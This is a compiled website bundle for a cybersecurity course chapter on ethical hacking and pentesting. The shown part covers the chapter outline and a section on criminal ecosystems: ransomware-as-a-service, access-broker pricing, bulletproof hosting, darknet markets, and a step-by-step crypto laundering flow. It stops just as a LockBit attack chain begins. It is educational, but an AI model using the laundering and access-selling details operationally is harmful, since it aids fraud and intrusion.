"use strict";
(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[16758],{

/***/ 88670
(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  assets: () => (/* binding */ assets),
  contentTitle: () => (/* binding */ contentTitle),
  "default": () => (/* binding */ MDXContent),
  frontMatter: () => (/* binding */ frontMatter),
  metadata: () => (/* reexport */ site_docs_courses_cyber_security_10_pentesting_md_6ac_namespaceObject),
  toc: () => (/* binding */ toc)
});

;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-10-pentesting-md-6ac.json
const site_docs_courses_cyber_security_10_pentesting_md_6ac_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/10-pentesting","title":"Chapter 10: Ethical Hacking & Pentesting","description":"Prereq: Chapter 9 (GRC) — pentesting validates that GRC-defined controls are effective.","source":"@site/docs/courses/cyber-security/10-pentesting.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/10-pentesting","permalink":"/ai-engineering-journey/cyber-security/10-pentesting","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":9,"frontMatter":{"id":"10-pentesting","slug":"/cyber-security/10-pentesting","title":"Chapter 10: Ethical Hacking & Pentesting","sidebar_label":"Chapter 10: Ethical Hacking & Pentesting","sidebar_position":9},"sidebar":"course-cyber-security","previous":{"title":"Chapter 9: Governance, Risk & Compliance (GRC)","permalink":"/ai-engineering-journey/cyber-security/09-grc"},"next":{"title":"Chapter 11: SOC Operations & Threat Hunting","permalink":"/ai-engineering-journey/cyber-security/11-soc-threat-hunting"}}');
// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
var jsx_runtime = __webpack_require__(74848);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(28453);
;// ./docs/courses/cyber-security/10-pentesting.md


const frontMatter = {
	id: '10-pentesting',
	slug: '/cyber-security/10-pentesting',
	title: 'Chapter 10: Ethical Hacking & Pentesting',
	sidebar_label: 'Chapter 10: Ethical Hacking & Pentesting',
	sidebar_position: 9
};
const contentTitle = 'Chapter 10: Ethical Hacking & Pentesting';

const assets = {

};



const toc = [{
  "value": "Learning Objectives",
  "id": "learning-objectives",
  "level": 2
}, {
  "value": "Chapter Outline",
  "id": "chapter-outline",
  "level": 2
}, {
  "value": "Section 1: Black Hat Hacking",
  "id": "section-1-black-hat-hacking",
  "level": 2
}, {
  "value": "1.1 Definition and Motivations",
  "id": "11-definition-and-motivations",
  "level": 3
}, {
  "value": "1.2 Criminal Operations Ecosystem",
  "id": "12-criminal-operations-ecosystem",
  "level": 3
}, {
  "value": "1.3 Real Attack Chains (Full Kill Chain)",
  "id": "13-real-attack-chains-full-kill-chain",
  "level": 3
}, {
  "value": "1.4 Malware Development",
  "id": "14-malware-development",
  "level": 3
}, {
  "value": "1.5 C2 Frameworks",
  "id": "15-c2-frameworks",
  "level": 3
}, {
  "value": "1.6 Zero-Day Discovery and Exploit Brokers",
  "id": "16-zero-day-discovery-and-exploit-brokers",
  "level": 3
}, {
  "value": "1.7 OPSEC Failures",
  "id": "17-opsec-failures",
  "level": 3
}, {
  "value": "Section 2: White Hat Hacking",
  "id": "section-2-white-hat-hacking",
  "level": 2
}, {
  "value": "2.1 Definition and Purpose",
  "id": "21-definition-and-purpose",
  "level": 3
}, {
  "value": "2.2 Legal Framework",
  "id": "22-legal-framework",
  "level": 3
}, {
  "value": "2.3 Certifications",
  "id": "23-certifications",
  "level": 3
}, {
  "value": "2.4 Bug Bounty Platforms",
  "id": "24-bug-bounty-platforms",
  "level": 3
}, {
  "value": "2.5 Vulnerability Disclosure",
  "id": "25-vulnerability-disclosure",
  "level": 3
}, {
  "value": "2.6 Types of Penetration Testing",
  "id": "26-types-of-penetration-testing",
  "level": 3
}, {
  "value": "2.7 Pentest Methodologies",
  "id": "27-pentest-methodologies",
  "level": 3
}, {
  "value": "2.8 Reporting",
  "id": "28-reporting",
  "level": 3
}, {
  "value": "Section 3: Gray Hat Hacking",
  "id": "section-3-gray-hat-hacking",
  "level": 2
}, {
  "value": "3.1 Definition and Characteristics",
  "id": "31-definition-and-characteristics",
  "level": 3
}, {
  "value": "3.2 Ethical Dilemmas",
  "id": "32-ethical-dilemmas",
  "level": 3
}, {
  "value": "3.3 Famous Gray Hat Cases",
  "id": "33-famous-gray-hat-cases",
  "level": 3
}, {
  "value": "3.4 Legal Gray Areas",
  "id": "34-legal-gray-areas",
  "level": 3
}, {
  "value": "3.5 Bug Bounty Disputes",
  "id": "35-bug-bounty-disputes",
  "level": 3
}, {
  "value": "Section 4: Penetration Testing Lab - Full Walkthrough",
  "id": "section-4-penetration-testing-lab---full-walkthrough",
  "level": 2
}, {
  "value": "4.1 Lab Setup",
  "id": "41-lab-setup",
  "level": 3
}, {
  "value": "4.2 Phase 1: Reconnaissance",
  "id": "42-phase-1-reconnaissance",
  "level": 3
}, {
  "value": "4.3 Phase 2: Scanning",
  "id": "43-phase-2-scanning",
  "level": 3
}, {
  "value": "4.4 Phase 3: Enumeration",
  "id": "44-phase-3-enumeration",
  "level": 3
}, {
  "value": "4.5 Phase 4: Exploitation",
  "id": "45-phase-4-exploitation",
  "level": 3
}, {
  "value": "4.6 Phase 5: Post-Exploitation",
  "id": "46-phase-5-post-exploitation",
  "level": 3
}, {
  "value": "4.7 Phase 6: Pivoting and Tunneling",
  "id": "47-phase-6-pivoting-and-tunneling",
  "level": 3
}, {
  "value": "4.8 Phase 7: C2 Frameworks",
  "id": "48-phase-7-c2-frameworks",
  "level": 3
}, {
  "value": "4.9 Phase 8: Reporting",
  "id": "49-phase-8-reporting",
  "level": 3
}, {
  "value": "4.10 Custom YARA Rule for C2 Detection",
  "id": "410-custom-yara-rule-for-c2-detection",
  "level": 3
}, {
  "value": "Section 5: Case Studies",
  "id": "section-5-case-studies",
  "level": 2
}, {
  "value": "Case Study 1: Carbanak/Fin7 — $1B+ Bank Heist",
  "id": "case-study-1-carbanakfin7--1b-bank-heist",
  "level": 3
}, {
  "value": "Case Study 2: Marcus Hutchins (MalwareTech) — WannaCry Kill Switch",
  "id": "case-study-2-marcus-hutchins-malwaretech--wannacry-kill-switch",
  "level": 3
}, {
  "value": "Case Study 3: Khalil Shreateh — Facebook Bug Bounty Dispute",
  "id": "case-study-3-khalil-shreateh--facebook-bug-bounty-dispute",
  "level": 3
}, {
  "value": "Case Study 4: Lazarus Group — North Korea&#39;s Cyber Army",
  "id": "case-study-4-lazarus-group--north-koreas-cyber-army",
  "level": 3
}, {
  "value": "Case Study 5: Samy Kamkar — MySpace Worm to Security Researcher",
  "id": "case-study-5-samy-kamkar--myspace-worm-to-security-researcher",
  "level": 3
}, {
  "value": "Case Study 6: LAPSUS$ — Teen Cybercrime Syndicate",
  "id": "case-study-6-lapsus--teen-cybercrime-syndicate",
  "level": 3
}, {
  "value": "Section 6: Comparison Tables",
  "id": "section-6-comparison-tables",
  "level": 2
}, {
  "value": "6.1 Black Hat vs White Hat vs Gray Hat Comparison",
  "id": "61-black-hat-vs-white-hat-vs-gray-hat-comparison",
  "level": 3
}, {
  "value": "6.2 Pentest Types Comparison",
  "id": "62-pentest-types-comparison",
  "level": 3
}, {
  "value": "6.3 Testing Knowledge Levels",
  "id": "63-testing-knowledge-levels",
  "level": 3
}, {
  "value": "6.4 C2 Framework Comparison",
  "id": "64-c2-framework-comparison",
  "level": 3
}, {
  "value": "6.5 Bug Bounty Platforms Comparison",
  "id": "65-bug-bounty-platforms-comparison",
  "level": 3
}, {
  "value": "6.6 Attack vs Defense Mindset",
  "id": "66-attack-vs-defense-mindset",
  "level": 3
}, {
  "value": "6.7 Legal Frameworks by Country",
  "id": "67-legal-frameworks-by-country",
  "level": 3
}, {
  "value": "Section 7: OSCP Methodology Guide",
  "id": "section-7-oscp-methodology-guide",
  "level": 2
}, {
  "value": "7.1 OSCP Exam Overview",
  "id": "71-oscp-exam-overview",
  "level": 3
}, {
  "value": "7.2 OSCP Methodology",
  "id": "72-oscp-methodology",
  "level": 3
}, {
  "value": "7.3 OSCP Exam Tips",
  "id": "73-oscp-exam-tips",
  "level": 3
}, {
  "value": "Section 8: Interview Corner",
  "id": "section-8-interview-corner",
  "level": 2
}, {
  "value": "Q1: What is the difference between a vulnerability assessment and a penetration test?",
  "id": "q1-what-is-the-difference-between-a-vulnerability-assessment-and-a-penetration-test",
  "level": 3
}, {
  "value": "Q2: Explain the Cyber Kill Chain and how it maps to penetration testing.",
  "id": "q2-explain-the-cyber-kill-chain-and-how-it-maps-to-penetration-testing",
  "level": 3
}, {
  "value": "Q3: How would you escalate privileges on a Linux server after gaining www-data access?",
  "id": "q3-how-would-you-escalate-privileges-on-a-linux-server-after-gaining-www-data-access",
  "level": 3
}, {
  "value": "Q4: How would you approach a Windows domain controller assessment?",
  "id": "q4-how-would-you-approach-a-windows-domain-controller-assessment",
  "level": 3
}, {
  "value": "Q5: Explain the difference between a reverse shell and a bind shell. When would you use each?",
  "id": "q5-explain-the-difference-between-a-reverse-shell-and-a-bind-shell-when-would-you-use-each",
  "level": 3
}, {
  "value": "Q6: How would you bypass Windows Defender during a penetration test?",
  "id": "q6-how-would-you-bypass-windows-defender-during-a-penetration-test",
  "level": 3
}, {
  "value": "Q7: What is pass-the-hash and how does it work?",
  "id": "q7-what-is-pass-the-hash-and-how-does-it-work",
  "level": 3
}, {
  "value": "Q8: What is your methodology for web application penetration testing?",
  "id": "q8-what-is-your-methodology-for-web-application-penetration-testing",
  "level": 3
}, {
  "value": "Q9: How would you exfiltrate data from a highly monitored network?",
  "id": "q9-how-would-you-exfiltrate-data-from-a-highly-monitored-network",
  "level": 3
}, {
  "value": "Q10: Explain the difference between red team, blue team, and purple team.",
  "id": "q10-explain-the-difference-between-red-team-blue-team-and-purple-team",
  "level": 3
}, {
  "value": "Q11: What is Kerberoasting and how do you mitigate it?",
  "id": "q11-what-is-kerberoasting-and-how-do-you-mitigate-it",
  "level": 3
}, {
  "value": "Q12: How would you find and exploit a Server-Side Request Forgery (SSRF) vulnerability?",
  "id": "q12-how-would-you-find-and-exploit-a-server-side-request-forgery-ssrf-vulnerability",
  "level": 3
}, {
  "value": "Q13: Explain the NTLM authentication protocol and its weaknesses.",
  "id": "q13-explain-the-ntlm-authentication-protocol-and-its-weaknesses",
  "level": 3
}, {
  "value": "Q14: What is BloodHound and how do you use it in assessments?",
  "id": "q14-what-is-bloodhound-and-how-do-you-use-it-in-assessments",
  "level": 3
}, {
  "value": "Q15: Walk me through a typical Active Directory attack chain from zero access.",
  "id": "q15-walk-me-through-a-typical-active-directory-attack-chain-from-zero-access",
  "level": 3
}, {
  "value": "Section 9: Applications in Real Systems",
  "id": "section-9-applications-in-real-systems",
  "level": 2
}, {
  "value": "Enterprise Security Programs",
  "id": "enterprise-security-programs",
  "level": 3
}, {
  "value": "Financial Services",
  "id": "financial-services",
  "level": 3
}, {
  "value": "Healthcare",
  "id": "healthcare",
  "level": 3
}, {
  "value": "Cloud Providers",
  "id": "cloud-providers",
  "level": 3
}, {
  "value": "Government &amp; Defense",
  "id": "government--defense",
  "level": 3
}, {
  "value": "E-commerce",
  "id": "e-commerce",
  "level": 3
}, {
  "value": "Critical Infrastructure",
  "id": "critical-infrastructure",
  "level": 3
}, {
  "value": "Technology Vendors",
  "id": "technology-vendors",
  "level": 3
}, {
  "value": "Summary",
  "id": "summary",
  "level": 2
}, {
  "value": "TypeScript Implementations",
  "id": "typescript-implementations",
  "level": 2
}, {
  "value": "Reconnaissance Toolkit",
  "id": "reconnaissance-toolkit",
  "level": 3
}, {
  "value": "Exploitation Validator",
  "id": "exploitation-validator",
  "level": 3
}, {
  "value": "Mermaid Diagrams",
  "id": "mermaid-diagrams",
  "level": 2
}, {
  "value": "Penetration Testing Methodology",
  "id": "penetration-testing-methodology",
  "level": 3
}, {
  "value": "Metasploit Exploitation Chain",
  "id": "metasploit-exploitation-chain",
  "level": 3
}, {
  "value": "Chapter Quiz",
  "id": "chapter-quiz",
  "level": 2
}, {
  "value": "Practical Takeaways",
  "id": "practical-takeaways",
  "level": 2
}, {
  "value": "Exercises",
  "id": "exercises",
  "level": 2
}, {
  "value": "Review Questions",
  "id": "review-questions",
  "level": 3
}, {
  "value": "Practical Exercises",
  "id": "practical-exercises",
  "level": 3
}, {
  "value": "Challenge Problems",
  "id": "challenge-problems",
  "level": 3
}];
function _createMdxContent(props) {
  const _components = {
    a: "a",
    annotation: "annotation",
    blockquote: "blockquote",
    code: "code",
    details: "details",
    h1: "h1",
    h2: "h2",
    h3: "h3",
    header: "header",
    hr: "hr",
    li: "li",
    math: "math",
    mi: "mi",
    mn: "mn",
    mo: "mo",
    mrow: "mrow",
    ol: "ol",
    p: "p",
    pre: "pre",
    semantics: "semantics",
    span: "span",
    strong: "strong",
    summary: "summary",
    table: "table",
    tbody: "tbody",
    td: "td",
    th: "th",
    thead: "thead",
    tr: "tr",
    ul: "ul",
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
    children: [(0,jsx_runtime.jsx)(_components.header, {
      children: (0,jsx_runtime.jsx)(_components.h1, {
        id: "chapter-10-ethical-hacking--pentesting",
        children: "Chapter 10: Ethical Hacking & Pentesting"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Prereq:"
        }), " Chapter 9 (GRC) — pentesting validates that GRC-defined controls are effective.\n", (0,jsx_runtime.jsx)(_components.strong, {
          children: "Next:"
        }), " This is the final chapter — review the full cyber-security roadmap from fundamentals to advanced testing."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "learning-objectives",
      children: "Learning Objectives"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Define Black Hat, White Hat, and Gray Hat hacking with real-world examples."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the full ethical hacking methodology and penetration testing lifecycle."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Execute a complete penetration test from reconnaissance to reporting."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Understand criminal operations, exploit development, and C2 frameworks."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Apply legal frameworks, disclosure ethics, and reporting standards."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Build a home pentesting lab and perform hands-on exploitation."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-outline",
      children: "Chapter Outline"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Section"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Topics"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Black Hat Hacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Criminal motivations, RaaS, IABs, C2 frameworks, OPSEC failures"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "White Hat Hacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Legal framework, certifications, bug bounties, pentest methodology"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Gray Hat Hacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ethics, dilemmas, famous cases, legal gray areas"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Pentesting Lab"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full 8-phase walkthrough with tool commands and outputs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Practical Examples"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15+ hands-on exploits with full command listings"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Case Studies"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Carbanak/Fin7, Marcus Hutchins, Khalil Shreateh, Lazarus, Samy Kamkar, LAPSUS$"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Comparison Tables"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Black vs White vs Gray, C2 frameworks, pentest types"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Interview Corner"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15+ Q&As for pentesting job interviews"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-1-black-hat-hacking",
      children: "Section 1: Black Hat Hacking"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "11-definition-and-motivations",
      children: "1.1 Definition and Motivations"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Black Hat hackers are individuals who break into systems without authorization, typically for personal gain, malicious purposes, or ideological reasons. Unlike White Hats who operate with permission, Black Hats violate laws, ethical standards, and organizational policies."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Primary Motivations:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Motivation"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Financial Gain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Direct theft, ransomware, fraud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Carbanak gang stealing $1B+ from banks"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Espionage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "State-sponsored intelligence gathering"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "APT10 stealing IP from aerospace firms"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hacktivism"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Political or social cause activism"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anonymous operations against government targets"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cyber Warfare"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Nation-state military operations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Russian GRU targeting Ukrainian infrastructure"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cybercrime-as-a-Service"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Selling access/tools to other criminals"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access Brokers (IABs) on darknet forums"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Reputation/Skill"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Proving capability in hacker communities"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DefCon CTF winners turned criminal"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Insider Threat"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disgruntled employees, financial pressure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tesla employee sabotaging manufacturing systems"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "12-criminal-operations-ecosystem",
      children: "1.2 Criminal Operations Ecosystem"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Black Hat operations have professionalized into a mature underground economy. Understanding this ecosystem is essential for both offense and defense."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Ransomware-as-a-Service (RaaS):"
      }), "\nRaaS is a business model where ransomware developers license their malware to \"affiliates\" who execute attacks in exchange for a percentage of ransoms (typically 70-80% to affiliates, 20-30% to developers)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Affiliate Program Structure:\n┌─────────────┐     ┌──────────────┐     ┌─────────────┐\n│ RaaS Dev    │────→│ Affiliates   │────→│ Victims     │\n│ (builds)    │     │ (deploys)    │     │ (pays)      │\n└──────┬──────┘     └──────┬───────┘     └──────┬──────┘\n       │                   │                     │\n       │ 70-80% share      │                     │\n       │ ←─────────────────┤                     │\n       │                   │   Cryptocurrency     │\n       │                   │ ←───────────────────│\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Major RaaS operations: LockBit 3.0 (most deployed in 2023-2024), ALPHV/BlackCat, Royal, Black Basta, Clop, REvil (disrupted but re-emerged)."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Initial Access Brokers (IABs):"
      }), "\nIABs specialize in breaching organizations and selling access to ransomware groups or other threat actors. Access is typically sold on darknet forums (Exploit, XSS, Russian Market) priced by revenue size and industry."]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "IAB Pricing Examples (from observed market data):\n- RDP access to small business: $500-$2,000\n- VPN access to enterprise: $2,000-$10,000\n- Citrix/VDI access: $1,000-$5,000\n- Domain admin access: $5,000-$20,000\n- Email access to CFO/CXO: $1,000-$3,000\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Common IAB techniques: scanning for exposed RDP (port 3389), VPN vulnerabilities (Pulse Secure, Citrix ADC), phishing campaigns, purchasing stolen credentials from info-stealer logs."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Bulletproof Hosting:"
      }), "\nBulletproof Hosting (BPH) providers operate servers that ignore abuse complaints, tolerate malicious content, and resist law enforcement takedowns. They typically operate in jurisdictions with weak cybercrime enforcement (Russia, Ukraine, certain Caribbean nations)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "BPH services include:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "DDoS-protected dedicated servers"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Domain registration with fake WHOIS data"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Fast-flux DNS networks"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Anonymous payment (cryptocurrency)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "No logging policy"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Darknet Markets:"
      }), "\nMarkets operating on Tor network for illegal goods and services. Major markets include:"]
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Market"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Specialty"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Notable"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Russian Market (RAMP)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Initial access, exploits"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Survived multiple takedowns"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Exploit (.in)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Exploits, malware, botnets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Russian-language"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "XSS (.is)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAB access, CVEs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires invitation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hydra Market"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Drugs, digital services"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Taken down by German police 2022"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "AlphaBay"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "General illicit goods"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FBI takedown 2017, relaunched 2021"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Cryptocurrency Laundering:"
      }), "\nCriminal proceeds are laundered through crypto to obfuscate the trail:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Tumbling/Mixing:"
        }), " Services like Tornado Cash (Ethereum), Wasabi Wallet, ChipMixer accept crypto and return \"clean\" coins from a pool"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Chain Hopping:"
        }), " Converting between blockchains (Bitcoin → Monero → Ethereum) to break chain analysis"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Renames:"
        }), " Using privacy coins (Monero, Zcash) that obscure transaction details"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Casinos/Gambling:"
        }), " Gambling platforms that accept crypto with minimal KYC"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "NFT Wash Trading:"
        }), " Buying/selling NFTs between own wallets to create fake transaction history"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Pig Butchering Scams:"
        }), " Romance scam victims launder money through crypto exchanges"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Money Laundering Flow:\nBitcoin (stolen) → Tornado Cash (mixer) → Monero (privacy coin) →\nCentralized Exchange (with fake KYC) → USDT → OTC Desk → Fiat Currency\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "13-real-attack-chains-full-kill-chain",
      children: "1.3 Real Attack Chains (Full Kill Chain)"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Chain Example: LockBit Ransomware Breach"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
